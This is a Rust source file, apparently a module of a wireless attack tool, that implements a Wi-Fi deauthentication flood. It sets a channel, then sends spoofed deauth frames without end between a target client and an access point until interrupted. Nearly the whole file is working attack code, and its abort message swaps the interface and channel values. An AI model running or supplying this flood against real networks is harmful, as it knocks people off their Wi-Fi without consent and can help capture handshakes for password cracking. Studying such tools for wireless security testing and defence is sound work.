use std::{thread, time::Duration};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use crate::engines::DeauthArgs;
use crate::iface::IfaceManager;
use crate::builders::Frames;
use crate::sockets::Layer2Socket;
use crate::utils::{ CtrlCHandler, inline_display, abort };




pub struct Deauthentication {
    args     : DeauthArgs,
    builder  : Frames,
    frm_sent : usize,
    seq_num  : u16,
    socket   : Layer2Socket,
}


impl Deauthentication {

    pub fn new(args: DeauthArgs) -> Self {
        Self { 
            builder  : Frames::new(),
            frm_sent : 0,
            seq_num  : 1,
            socket   : Layer2Socket::new(&args.iface),
            args,
        }
    }



    pub fn execute(&mut self) {
        self.set_channel();
        self.send_endlessly();
    }



    fn set_channel(&self) {
        let done = IfaceManager::set_channel(&self.args.iface, self.args.channel);

        if !done {
            abort(
                format!(
                    "Uneable to set channel {} on interface {}", 
                    self.args.iface, 
                    self.args.channel
                )
            )
        }
    }



    fn send_endlessly(&mut self) {
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            self.send_frame(self.args.target_mac, self.args.bssid);
            self.send_frame(self.args.bssid, self.args.target_mac);
        }
        
        println!("\nFlood interrupted"); 
    }



    #[inline]
    fn send_frame(
        &mut self, 
        src_mac : [u8; 6], 
        dst_mac : [u8; 6], 
    ) {
        let frame = self.builder.deauth(dst_mac, src_mac, self.args.bssid, self.seq_num);
        
        self.socket.send(frame);
        self.update_seq_num();
        self.frm_sent += 1;

        inline_display(&format!("Frames sent: {}", &self.frm_sent));
        thread::sleep(Duration::from_millis(self.args.delay));
    }



    #[inline]
    fn update_seq_num(&mut self) {
        if self.seq_num >= 4095 {
            self.seq_num = 0;
        }

        self.seq_num += 1;
    }

}



impl crate::EngineTrait for Deauthentication {
    type Args = DeauthArgs;
    
    fn new(args: Self::Args) -> Self {
        Deauthentication::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}